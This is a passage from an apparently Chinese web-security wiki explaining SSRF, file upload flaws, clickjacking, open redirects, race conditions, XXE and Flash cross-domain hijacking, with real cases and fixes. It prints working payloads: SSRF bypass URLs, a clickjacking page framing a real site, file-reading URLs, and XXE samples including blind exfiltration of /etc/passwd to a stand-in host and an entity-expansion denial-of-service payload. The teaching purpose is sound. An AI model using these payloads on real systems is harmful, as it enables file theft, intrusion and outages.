　　如果上述post方式对referer验证的特别严格，有的时候由于程序员对请求类型判断不是很严格，可以导致post请求改写为get请求，从而CSRF。 比如post请求为 http://xxx.com/yy.php postdata为aa=xx1&bb=xx2 然后将请求改为 http://xxx.comyy.php?aa=xx1&bb=xx2 直接以get请求的方式进行访问，如果请求成功，即可以此种方式绕过对referer的检测，从而CSRF。

**7、相关资源**

---
[Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/CSRF)

[跨站请求伪造](http://zh.wikipedia.org/wiki/跨站请求伪造)

[Flash CSRF](http://drops.wooyun.org/tips/688)

[Flash跨域策略文件crossdomain.xml安全配置详解](http://www.freebuf.com/articles/2950.html)

[http://sethsec.blogspot.jp/2014/03/exploiting-misconfigured-crossdomainxml.html](http://sethsec.blogspot.jp/2014/03/exploiting-misconfigured-crossdomainxml.html)

[CSRF 攻击的应对之道](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/)


##SSRF（Server Side Request Forgery）

**1、背景**

---
  SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。

**2、成因**

---
  SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容、加载指定地址的图片、下载等。

**3、攻击类型**

---

1. 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。
2. 攻击运行在内网或本地的应用程序(比如溢出)。
3. 对内网web应用进行指纹识别，通过访问默认文件实现。
4. 攻击内外网的web应用，主要是使用get参数就可以实现的攻击(比如struts2，sqli等)。
5. 利用file协议读取本地文件等。

**4、漏洞挖掘**

---
漏洞挖掘方法分为两种：

从WEB功能上寻找

从URL关键字寻找

常见WEB功能：

	1. 分享：通过URL地址分享网页内容
	2. 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
	3. 在线翻译：通过URL地址翻译对应文本的内容。
	4. 图片加载与下载：通过URL地址加载或下载图片。
	5. 图片、文章收藏功能

常见URL关键字：

	share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain

5、绕过方式

1. 使用@

		http://A.com@10.10.10.10
		http://A.com:B@10.10.10.10
2. ip地址转换成进制

		115.239.210.26 ＝ 16373751032
3. 使用短地址来生成内网地址

		http://10.10.116.11 
		http://t.cn/RwbLKDx
4. 端口绕过

	http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.50.33.43:8080/

5. 通过js跳转

[百度某SSRF绕过限制可通内网(可shell)](http://www.wooyun.org/bugs/wooyun-2015-0102331)
6. xip.io

		http://tp.chinaso.com/web?url=http://www.10.10.0.179.xip.io&fr=client
		10.0.0.1.xip.io 10.0.0.1
		www.10.0.0.1.xip.io 10.0.0.1
		mysite.10.0.0.1.xip.io 10.0.0.1
		foo.bar.10.0.0.1.xip.io 10.0.0.1
	
**6、修复方案**

---
1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。

3.限制请求的端口为http常用的端口，比如，80、443、8080、8090。

4.黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。

5.禁用不需要的协议。仅仅允许http和https请求。

**7、相关资源**

---
[SSRF攻击实例解析](http://www.freebuf.com/articles/web/20407.html)

[乌云多数已修复SSRF漏洞可被绕过](http://www.wooyun.org/bugs/wooyun-2015-099135)

[SSRF漏洞的挖掘经验](https://sobug.com/article/detail/11)



##文件上传漏洞

**1、背景介绍**

---
  在网站的运营过程中，不可避免地要对网站的某些页面或者内容进行更新，这时便需要使用到网站的文件上传的功能。如果不对被上传的文件进行限制或者限制被绕过，该功能便有可能会被利用于上传可执行文件、脚本到服务器上，进而进一步导致服务器沦陷。

**2、漏洞成因**

---
导致文件上传的漏洞的原因较多，主要包括以下几类：

1. 服务器配置不当
2. 开源编辑器上传漏洞
3. 本地文件上传限制被绕过
4. 过滤不严或被绕过
5. 文件解析漏洞导致文件执行
6. 文件路径截断
7. 服务器配置不当

  当服务器配置不当时，在不需要上传页面的情况下便可导致任意文件上传，参见HTTP请求方法（PUT）。

***开源编辑器上传漏洞***

  很多开源的编辑器历史上都有不同的上传漏洞，包括但不只限于CKEditor,CKEditor的文件上传漏洞参见CKEditor。

***本地文件上传限制被绕过***

  只在客户端浏览器上做了文件限制而没有在远程的服务器上做限制，只需要修改数据包就可以轻松绕过限制。

***过滤不严或被绕过***

  有些网站上使用了黑名单过滤掉了一些关键的可执行文件脚本后缀等，但黑名单不全或者被绕过，导致可执行脚本文件被上传到服务器上，执行。

  如在服务器后端过滤掉了后缀为.php的文件，但并没有过滤掉.php3等其他可执行文件脚本后缀，攻击者就可以上传带有其他的可执行文件脚本本后缀的恶意文件到服务器上。

***常用的一些可执行的文件脚本的后缀***

	php
	php2
	php3
	php5
	phtml
	asp
	aspx
	ascx
	ashx
	cer
	jsp
	jspx
  在某些情况下由于管理员错误的服务器配置（将.html后缀的文件使用php进行解析等）会导致.html、.xml等静态页面后缀的文件也可被执行。

在上传文件保存磁盘为NTFS格式时可通过::$DATA绕过黑名单限制，参见[NTFS中的ADS的一些问题](http://zone.wooyun.org/content/1064)

  有时服务器只对第一个被上传的文件进行了检查，这时通过同时上传多个文件并将恶意文件掺杂进其中也可绕过服务器的过滤。

***文件解析漏洞导致文件执行***

  当服务器上存在文件解析漏洞时，合法的文件名便可导致带有恶意代码的文件被执行，参见[解析漏洞](http://wiki.wooyun.org/server:resolve)。

***文件路径截断***

  在上传的文件中使用一些特殊的符号，使得文件被上传到服务器中时路径被截断从而控制文件路径。

常用的进行文件路径截断的字符如下

	\0
	?
	%00
  在可以控制文件路径的情况下，使用超长的文件路径也有可能会导致文件路径截断。

**3、漏洞修复**

---
服务器配置不当

重新配置好服务器。

服务器PUT方法配置不当可参见[HTTP请求方法（PUT）](http://wiki.wooyun.org/server:httpput)

开源编辑器上传漏洞

若新版编辑器已修复漏洞，请更新编辑器版本。

本地文件上传限制被绕过

在服务器后端对上传的文件进行过滤。

过滤不严或被绕过

建议使用白名单的方法对文件进行过滤。

文件解析漏洞导致文件执行

文件解析漏洞的修复可参考[文件上传](http://wiki.wooyun.org/web:file-upload)。

文件路径截断

使用随机数改写文件名和文件路径,不要使用用户定义的文件名和文件路径。

除了以上的方法之外，还可将被上传的文件限制在某一路径下，并在文件上传目录禁止脚本解析。

4、实际案例
[KXmail任意文件上传导致代码执行](http://www.wooyun.org/bugs/wooyun-2010-0103185)

[KingCms最新版（k9）GetShell](http://www.wooyun.org/bugs/wooyun-2010-0102022)

[中华人民共和国商务部某分站任意文件上传GETSHELL](http://www.wooyun.org/bugs/wooyun-2010-098102)

[海尔某站文件上传GetShell](http://www.wooyun.org/bugs/wooyun-2010-097048)

5、相关资源
[PHP任意文件上传漏洞（CVE-2015-2348）分析与利用](http://zone.wooyun.org/content/19529)

[NTFS中的ADS的一些问题[欢迎一起讨论，求思路求方法](http://zone.wooyun.org/content/1064)

[CVE-2015-2348](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348)

[CVE-2006-7243](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2006-7243)


##Click Jacking/点击劫持

**1、相关背景介绍**

---
  Clickjacking（点击劫持）是由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼在2008年首创的。

  是一种视觉欺骗手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置。

  由于点击劫持的出现，便出现了反frame嵌套的方式，因为点击劫持需要iframe嵌套页面来攻击。

下面代码是最常见的防止frame嵌套的例子：

	if(top.location!=location)
	    top.location=self.location;
    
**2、成因**

---
  页面允许被iframe嵌套，当嵌套一个透明不可见的页面时，你鼠标的操作其实是被嵌套的看不到的页面，浮在表层的一系列图片按钮只是为了诱骗你点击固定的位置从而达到攻击者的目的。

**3、攻击方式及危害**

---
2010年黑帽大会放出的Clickjacking工具，可以方便的进行做点击劫持演示：

[cjtool](http://www.contextis.com/files/cjtool.zip)

**4、实际案例**

---
Sogili：[新浪微博关注功能点击劫持漏洞](http://www.wooyun.org/bugs/wooyun-2010-018558)

冷冷的夜：[腾讯微博clickhijacking(不要被你的双眼欺骗)](http://www.wooyun.org/bugs/wooyun-2010-019683)

腾讯微博的点击劫持案例，目前腾讯已经修复，做了防iframe嵌套的措施。

	<html>
	  <head> 
	    <title>
	      腾讯微博clickjacking 
	    </title> 
	    <script>
	      function showHide_frame() {
	        var text_1 = document.getElementById("target");
	        text_1.style.opacity = this.checked ? "0.5": "0";
	        text_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity=" + (this.checked ? "50": "0") + ");"
	      }
	    </script> 
	  </head> 
	  <body> 
	    <div style="position:absolute;top:20px;left:300px;"> 
	      <font color="”#AA00DD″" size="22">腾讯微博 clickjacking attack </font> 
	    </div> 
	    <div style="position:absolute;color:#00ff00;top:184px;left:579px"> 
	      <div style="color:red">
	        下一页
	      </div> 
	      <img src="http://www.baidu.com/img/bdlogo.gif" /> 
	    </div> 
	    <div>
	      <iframe id="target" src="http://t.qq.com/lenglengdy/follower#mainWrapper" style="position:absolute;width:100%;height:500px;left:200px;filter:alpha(opacity=0.0);opacity:0.0;"></iframe>
	    </div>  
	    <div style="position:absolute;top:440px;left:550px;"> 
	      <input id="showHide_frame" type="checkbox" onclick="showHide_frame.call(this);" /> 
	      <label for="showHide_frame"> Show the jacked I--Frame </label> 
	    </div> 
	  </body>
	</html>
**5、修复方案**

---
X-FRAME-OPTIONS

X-FRAME-OPTIONS是微软提出的一个http头，专门用来防御利用iframe嵌套的点击劫持攻击。

并且在IE8、Firefox3.6、Chrome4以上的版本均能很好的支持。

这个头有三个值：

	DENY               // 拒绝任何域加载
	SAMEORIGIN         // 允许同源域下加载
	ALLOW-FROM         // 可以定义允许frame加载的页面地址
	php中设置示例：

header ("X-FRAME-OPTIONS:DENY");
目前最好的js的防御方案为：

	<head>
	<style> body { display : none;} </style>
	</head>
	<body>
	<script>
	if (self == top) {
	  var theBody = document.getElementsByTagName('body')[0];
	  theBody.style.display = "block";
	} else {
	  top.location = self.location;
	}
	</script>
	
6、相关资源
[Clickjacking Tool](http://zone.wooyun.org/content/3858)

[Clickjacking简单介绍](http://drops.wooyun.org/papers/104)


##URL redirection/URL重定向

**1、相关背景介绍**

---
　　由于应用越来越多的需要和其他的第三方应用交互，以及在自身应用内部根据不同的逻辑将用户引向到不同的页面，譬如一个典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致一些安全问题，特定条件下可能引起严重的安全漏洞。

**2、成因**

---
对于URL跳转的实现一般会有几种实现方式：

	META标签内跳转
	javascript跳转
	header头跳转
　　通过以GET或者POST的方式接收将要跳转的URL，然后通过上面的几种方式的其中一种来跳转到目标URL。一方面，由于用户的输入会进入Meta，javascript，http头所以都可能发生相应上下文的漏洞，如xss等等，但是同时，即使只是对于URL跳转本身功能方面就存在一个缺陷，因为会将用户浏览器从可信的站点导向到不可信的站点，同时如果跳转的时候带有敏感数据一样可能将敏感数据泄漏给不可信的第三方。

譬如一个典型的登录跳转如下：

	<?php
	      $url=$_GET['jumpto'];
	      header("Location: $url");
	?>
如果jumpto没有任何限制，所以恶意用户可以提交

	http://wiki.wooyun.org/login.php?jumpto=http://www.evil.com 
　　来生成自己的恶意链接，安全意识较低的用户很可能会以为该链接展现的内容是wiki.wooyun.org从而可能产生欺诈行为，同时由于QQ，淘宝旺旺等在线IM都是基于URL的过滤，同时对一些站点会以白名单的方式放过，所以导致恶意URL在IM里可以传播，从而产生危害，譬如这里IM会认为wiki.wooyun.org都是可信的，但是通过在IM里点击上述链接将导致用户最终访问evil.com。

此外，由于底层操作类库支持多种协议，如未做过滤或过滤不周也会产生安全漏洞。如：

	http://wiki.wooyun.org/login.php?link=file:///etc/passwd
利用file协议即可成功读取服务器的/etc/passwd文件。

　　当已经针对url做了协议控制（只允许http访问）时还能做什么呢？：尝试下访问内网吧：

	http://wiki.wooyun.org/login.php?url=http%3A%2F%2Foa.wooyun.org%2F
这种问题就是由于对URL过滤不周而导致的。

**3、攻击方式及危害**

--
利用URL跳转漏洞可以绕过一些常见的基于白名单的安全机制。如：
　　传统IM里对于URL的传播会进行安全校验，但是对于大公司的域名及URL将直接允许通过并且显示为可信的URL，而一旦该URL里包含一些跳转漏洞将可能导致安全限制被绕过。恶意用户可以通过这种方式将用户引入恶意页面进行钓鱼、诈骗等。
　　常见的一些应用允许引入可信站点（如youku.com）的视频，而判定视频来源是否可信的方式往往是通过检查URL是否是youku.com来实现，如果youku.com内含一个url跳转漏洞，将导致最终引入的资源属于不可信的第三方资源或者恶意站点，最终导致安全问题。
　　URL跳转漏洞的危害并不只会影响到用户或其他网站。

　　当底层操作类库支持其他协议时，URL跳转漏洞可能导致本地的读取或网络信息被侦测等问题。如：

　　curl库支持一些其他的协议，如不做限制，可使用file协议读取本地文件，使用telnet探测端口信息等。
即使底层库不支持其他协议或者已对其他协议做了限制，如未限制网络边界也可能会产生问题。如：

可以利用http协议进行内网漫游等。

**4、实际案例**

--－
结界师：[WooYun-2010-00198](http://www.wooyun.org/bugs/wooyun-2010-0198)
该漏洞借助未验证的URL跳转，成功的将应用程序内部敏感的数据传递到了不安全的第三方区域。

kEvin1986：W[ooYun-2010-00012：](http://www.wooyun.org/bugs/wooyun-2010-012)
由于curl支持file、ftp、telnet等协议，导致了未正确过滤URL的地方可以被用来读取内网信息。

结界师：[WooYun-2013-26212：](http://www.wooyun.org/bugs/wooyun-2013-026212)

该漏洞虽然限制了使用的协议，但是未对网络边界进行限制，导致利用http协议成功实现了内网的漫游。

**5、修复方案**

---
　　理论上讲，url跳转属于CSRF的一种，我们需要对传入的URL做有效性的认证，保证该URL来自于正确的地方，限制的方式同防止csrf一样可以包括：

　　加入referer的限制，保证该URL的有效性，避免恶意用户自己生成跳转链接。
加入有效性验证Token，避免用户生成自己的恶意链接从而被利用（但是如果功能本身要求比较开放，可能会产生一定的限制）。
　　设置严格白名单及网络边界:功能要求比较开放的情况下，需要严格限定协议以及可访问的网络。

**6、漏洞扫描与发现**

---
　　测试URL重定向漏洞以灰盒测试为主，因其主要发生在如javascript中的window.location这类地方，在审查代码时如果发现window.location的地址是用户可控（可输入）的，就要重点检查是否验证了该地址的合法性并进行了相应的过滤。

**7、相关资源**

---
[URL重定向/跳转漏洞](http://drops.wooyun.org/papers/58)

[由参数URL想到的](http://drops.wooyun.org/papers/154)

[Testing for Client Side URL Redirect (OTG-CLIENT-004)](https://www.owasp.org/index.php/Testing_for_Client_Side_URL_Redirect_(OTG-CLIENT-004))


##Race Conditions/条件竞争

**1、相关背景介绍**

---
　　条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。

**2、成因**

---
　　下面以相关操作逻辑顺序设计的不合理为例，具体讨论一下这类问题的成因。在很多系统中都会包含上传文件或者从远端获取文件保存在服务器的功能（如：允许用户使用网络上的图片作为自己的头像的功能），下面是一段简单的上传文件释义代码：

	<?php
	  if(isset($_GET['src'])){
	    copy($_GET['src'],$_GET['dst']);
	    //...
	    //check file
	    unlink($_GET['dst']);
	    //...
	 }
	?>
　　这段代码看似一切正常，先通过`copy($GET['src'],$GET['dst'])`将文件从源地址复制到目的地址，然后检查`$GET['dst']`的安全性，如果发现`$GET['dst']`不安全就马上通过`unlink($_GET['dst'])`将其删除。但是，当程序在服务端并发处理用户请求时问题就来了。如果在文件上传成功后但是在相关安全检查发现它是不安全文件删除它以前这个文件就被执行了那么会怎样呢？

　　假设攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell文件，后续的一切就都不是问题了。

　　由上述过程我们可以看到这种“先将猛兽放进屋，再杀之”的处理逻辑在并发的情况下是十分危险的，极易导致条件竞争漏洞的发生。

**3、攻击方式及危害**

---
　　仍以上述情境为例，攻击者通过不断地发起访问上传的恶意文件请求的方法成功的将原有处理不安全文件

	上传文件E→删除不安全文件E
的业务逻辑变成了

	上传文件E→访问执行文件E，生成shell文件S→删除不安全文件E
不安全文件E虽然被删除了，但是有它生成出来的shell文件S却保留在了服务器中，对攻击者来说这个shell文件S才是后续攻击的关键。

**4、实际案例**

---
[felixk3y：WooYun-2014-49794：PHPCMS前台设计缺陷导致任意代码执行](http://www.wooyun.org/bugs/wooyun-2014-049794)

[felixk3y：WooYun-2014-48202：国内外多家vpn设备厂商批量漏洞(续集一)](http://www.wooyun.org/bugs/wooyun-2014-048202)

[乌云某处刷人民币漏洞成功套现](http://www.wooyun.org/bugs/wooyun-2015-099622)

[利用数据库缺陷实现刷乌云币](http://www.wooyun.org/bugs/wooyun-2013-025489)

**5、修复方案**

---
注意并发操作及相关操作逻辑是否得当，如上述获取远端文件时，尽量在将文件保存在本地前就进行相应的安全检查。其他建议待补充。

6、相关资源
[PHPCMS前台设计缺陷导致任意代码执行](http://www.wooyun.org/bugs/wooyun-2014-049794)

[代码审计之逻辑上传漏洞挖掘](http://drops.wooyun.org/papers/1957)


##XML External Entity attack/XXE攻击

**1、相关背景介绍**

---
可扩展标记语言（eXtensible Markup Language，XML）是一种标记语言，被设计用来传输和存储数据。XML应用极其广泛，如：
  
	* 普通列表项目文档格式：OOXML，ODF，PDF，RSS……
	* 图片格式：SVG，EXIF Headers……
	* 网络协议：WebDAV，CalDAV，XMLRPC，SOAP，REST，XMPP，SAML，XACML……
	* 配置文件：Spring配置文件，Struts2配置文件……

在XML 1.0标准中定义了实体的概念，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。

包含内部实体的XML文档：

	<?xml version="1.0" encoding="utf-8"?>
	 
	<!DOCTYPE entity [
	  <!ENTITY copyright "Copyright wiki.wooyun.org">
	]>
	 
	<wooyun>
	  <internal>&copyright;</internal>
	</wooyun>
包含外部实体的XML文档：

	<?xml version="1.0" encoding="utf-8"?>
	 
	<!DOCTYPE entity [
	  <!ENTITY wiki SYSTEM "http://wiki.wooyun.org/">
	]>
	 
	<wooyun>
	  <external>&wiki;</external>
	</wooyun>
在解析XML时，实体将会被替换成相应的引用内容。

XML外部实体（XML External Entity，XXE）攻击是一种常见的Web安全漏洞，攻击者可以通过XML的外部实体获取服务器中本应被保护的数据。

**2、成因**

---
XML解析器解析外部实体时支持多种协议


|libxml2|PHP           |Java   |.NET |
| -----|:----:| ----:|----|
|file   |file          |file   |file |
|http   |http          |http   |http |
|ftp    |ftp	          |ftp    |ftp  |
|       |php           |https  |https|
|       |compress.zlib |jar    |     |
|       |data          |netdoc	|     |
|       |glob          |mailto	|     |
|       |phar          |gopher	|     |     |

如使用file协议可以读取本地文件内容、使用http协议可以获取Web资源等，因此攻击者可构造恶意的外部实体，当解析器解析了包含“恶意”外部实体的XML类型文件时，便会导致被XXE攻击。

下面这个XML被解析时便会将本地/etc/passwd文件的内容读出来：

	<?xml version="1.0" encoding="utf-8"?>
	 
	<!DOCTYPE entity [
	  <!ENTITY file SYSTEM "file:///etc/passwd">
	]>
	 
	<wooyun>
	  <external>&file;</external>
	</wooyun>
注：如果读取的文件本身包含“<”、“&”等字符时会产生失败的情况，对于此类文件可以使用Base64编码绕过，具体方法如下：

	<?xml version="1.0" encoding="utf-8"?>
	 
	<!DOCTYPE entity [
	  <!ENTITY file SYSTEM ENTITY e SYSTEM "php://filter/read=convert.base64-encode/resource=http://wiki.wooyun.org">
	]>
	 
	<wooyun>
	  <external>&file;</external>
	</wooyun>
不同的解析器可能默认对于外部实体会有不同的处理规则,以PHP语言为例，xml_parse的实现方式为expat库，而simplexml_load使用的是libxml库，两个底层库在解析的时候细节并不一样，expat默认对外部实体并不解析，而simplexml_load默认情况下会解析外部实体等，所以simplexml_load函数会受此问题影响，而xml_parse则默认不会受到影响。下面是几种常见语言可能会受到此问题影响的解析XML的方法：

|PHP	|Java	|.NET|
| -----|:----:| ----:|
|DOM	|	|System.Xml.XmlDocument|
|SimpleXML|		|System.Xml.XmlReader|

**3、攻击方式及危害**

---
XXE的攻击方式分为显式攻击和盲攻击两种：

上述POC即为显式攻击，攻击者通过正常的回显将外部实体里的内容读取出来。

但是，在有些情况下无法通过这种方式完成XXE攻击，这时我们可以采取盲攻击的办法。

XXE盲攻击利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定服务器发起请求，然后在其指定服务器的日志（Apache日志）中读出文件的内容。

因在dtd中使用%来定义参数实体的方式只能在外部子集中使用，或由外部文件定义参数实体，引用到XML文件的dtd来使用，所以XML文件稍有不同：

	<?xml version="1.0" encoding="utf-8"?>
	 
	<!DOCTYPE entity [
	  <!ENTITY % call SYSTEM "http://example.com/evil.xml">
	  %call;
	]>
	 
	<wooyun>
	  <text>test</text>
	</wooyun>
其中`http://example.com/evil.xml`里的内容是：

	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://example.com/?file=%file;'>">
	%int;
	%send;
危害：

XXE漏洞会导致读取任意未授权文件，如上述POC即可读取服务器中的/etc/passwd文件；

因为基于树的XML解析器会把全部加载到内存中，因此XXE漏洞也有可能被用来恶意消耗内存进行拒绝服务攻击，例如:

	<?xml version = "1.0"?>
	 
	<!DOCTYPE entity [  
	    <!ENTITY wooyun "wooyun">
	    <!ELEMENT wooyunz (#PCDATA)>
	    <!ENTITY wooyun1 "&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;&wooyun;">
	    <!ENTITY wooyun2 "&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;&wooyun1;">
	    <!ENTITY wooyun3 "&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;&wooyun2;">
	    <!ENTITY wooyun4 "&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;&wooyun3;">
	    <!ENTITY wooyun5 "&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;&wooyun4;">
	    <!ENTITY wooyun6 "&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;&wooyun5;">
	    <!ENTITY wooyun7 "&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;&wooyun6;">
	    <!ENTITY wooyun8 "&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;&wooyun7;">
	    <!ENTITY wooyun9 "&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;&wooyun8;">
	]>
	 
	<wooyun>&wooyun9;</wooyun>
这个XML在定义实体是不断嵌套调用，如解析时未对大小进行限制，则可能会导致内存大量被消耗，从而实现拒绝服务攻击。

此外，还可以利用支持的协议构造出很多相关的攻击，如探测内网信息（如检测服务等）等。

**4、实际案例**

---
gainover：WooYun-2014-59783：[百度某功能XML实体注入（二)](http://wooyun.org/bugs/wooyun-2014-059783)

由于SVG本身是基于XML的，该漏洞在SVG转成JPG图片时的XML解析过程中厂商仅直接过滤了ENTITY关键字，但是由于DTD本身就支持调用外部的DTD文件，因此通过调用`<!DOCTYPE svg SYSTEM “http://example.com/xxe.dtd”>`的方式引入外部的DTD文件即成功避开了对ENTITY关键字的过滤，其中xxe.dtd的内容如下：

	<!ENTITY test SYSTEM "file:///etc/passwd">
iv4n：WooYun-2014-74069：[鲜果网RSS导入Blind XXE漏洞](http://www.wooyun.org/bugs/wooyun-2014-074069)

该漏洞的过程是利用参数实体实现了XXE盲攻击，在读取本地文件后，将读出本地文件的内容作为URL中的参数向其指定服务器发起请求，在指定服务器的Apache日志中即可看到读出的文件内容。

五道口杀气：WooYun-2014-59911：[从开源中国的某XXE漏洞到主站shell](http://www.wooyun.org/bugs/wooyun-2014-074069)

该漏洞在格式化xml时进行了解析且没有对外部实体进行限制，所以产生服务器上任意文件被读取的问题，从而导致主站的ssh用户名和密码泄露，被成功getshell。

**5、修复方案**

---
在默认情况下关闭内联DTD解析（Inline DTD parsing）、外部实体、实体，使用白名单来控制允许实用的协议。

了解所使用的XML解析器是否默认解析外部实体，如果默认解析应根据实际情况进行关闭或者限制。下面给出了一些常见的关闭方法：

PHP：

对于使用SimpleXML解析XML的方法可在加载实体之前添加`libxmldisableentity_loader(true);`语句以进制解析外部实体。

对于使用DOM解析XML的方法可在加载实体之前添加`libxmldisableentity_loader(true);`语句或者使用：

	<?php
	// with the DOM functionality:
	$dom = new DOMDocument();
	$dom->loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR);
	?>
对于XMLReader解析XML的方法可使用：

	<?php
	// with the XMLReader functionality:
	$doc = XMLReader::xml($badXml,'UTF-8',LIBXML_NONET);
	?>
Java：
	
	DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
	dbf.setExpandEntityReferences(false);
	.Net：

对于使用System.Xml.XmlReader解析XML的方法：

默认情况下，外部资源使用没有用户凭据的XmlUrlResolver对象进行解析。这意味着在默认情况下，可以访问任何不需要凭据的位置。通过执行下列操作之一，可以进一步保证安全：

1. 通过将XmlReaderSettings.XmlResolver属性设置为XmlSecureResolver对象限制XmlReader可访问的资源。
2. 通过将XmlReaderSettings.XmlResolver属性设置为null，不允许XmlReader打开任何外部资源。
3. 对于利用超大的XML文档进行拒绝服务攻击的问题，使用XmlReader时，通过设置MaxCharactersInDocument属性，可以限制能够分析的文档大小。
4. 通过设置MaxCharactersFromEntities属性，可以限制从扩展实体中生成的字符数。

Python：

	from lxml import etree
	xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
	
**6、漏洞扫描与发现****

---
检测XML是否被解析

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE ANY [
		<!ENTITY xxe "xxe test">
	]>
	<root>&xxe;</root>
如果显示了xxe test证明支持，进行第二步

是否支持外部实体:

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE ANY [
		<!ENTITY % xxe SYSTEM "http://192.168.5.1/xxe.xml">
	%xxe;
	]>
观察自己的服务器上得access.log，如果有xxe.xml的请求，证明可以加载外部实体。

然后判断是否有回显，有回显就直接加载外部实体来进行攻击

不能回显，则使用Blind XXE攻击方法

**7、相关资源**

---
[w3school：XML系列教程](http://www.w3school.com.cn/x.asp)

[Mark4z5：未知攻焉知防——XXE漏洞攻防](http://security.tencent.com/index.php/blog/msg/69)

[XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_/(XXE/)_Processing)

[读源码的猫：XXE漏洞以及Blind XXE总结](http://blog.csdn.net/u011721501/article/details/43775691)

[Chris Cornutt：Preventing XXE in PHP](http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html)

[Timothy D.Morgan：What You Didn't Know About XML External Entities Attacks](https://www.youtube.com/watch?v=eHSNT8vWLfc)



##XSCH (Cross Site Content Hijacking）

**1.相关背景介绍**

---
XSCH (Cross Site Content Hijacking）可翻译为跨站内容劫持，它和XSS有异曲同工之妙。它可以劫持获取用户敏感数据、劫持用户发起任意请求，是XSS和CSRF的一种变体，它和XSS比略显鸡肋，比CSRF更强大。不过，对于用户，我觉得这三者的危害是相同的，他们都可以危及到用户的数据或敏感信息。

**2.成因**

---
由于网站开发者在使用flash、Silverlight等进行开发的过程中的疏忽，没有对跨域策略文件（[crossdomain.xml](http://stackoverflow.com/tags/crossdomain.xml/info)）进行正确的配置导致问题产生。
例如：

	<cross-domain-policy><allow-access-from domain=“*”/></cross-domain-policy>
因为跨域策略文件配置为*，也就指任意域的flash都可以与它交互，导致可以发起请求、获取数据。

**3.攻击方式及危害**

---
flash在配置＊的情况下，可利用此[POC](https://github.com/nccgroup/CrossSiteContentHijacking)进行验证是否存在XSCH

深入： 在很多情况下，一些比较敏感的域都严格配置了自己的信任域 例如：

	<cross-domain-policy>
	<allow-access-from domain=“＊.test.com”/>
	<allow-access-from domain=“＊.test.com.cn”/>
	<allow-access-from domain=“＊.test.cn”/>
	</cross-domain-policy>
这样似乎看上去很安全，只有信任域的flash文件才能向它发送请求，但是我们可以上传一个flash文件到其中任意一个域下，当然直接上传flash似乎比较难，但是我们可以上传一个后缀是jpg但内容却是flash的文件，因为浏览器解析flash文件的时候和后缀并没有关系，而是和它的执行方式有关系，我们只要以falsh的形式引用它即可执行。 当我们可以利用flash进行跨域通讯的时候，用户的数据就不再安全，聪明的攻击者可以构造任意请求然后埋好陷阱等待者受害者。

**4.实际案例**

---
0x_Jin:wooyun-2010-088845： [http://wooyun.org/bugs/wooyun-2010-088845](http://wooyun.org/bugs/wooyun-2010-088845)

sohu某站上传过滤不严导致可劫持他人账号进行敏感操作

Jeary:wooyun-2010-0116384：[http://wooyun.org/bugs/wooyun-2010-0116384](http://wooyun.org/bugs/wooyun-2010-0116384)

搜狐焦点旗下搜狐家居可劫持任意账号（flash劫持案例）

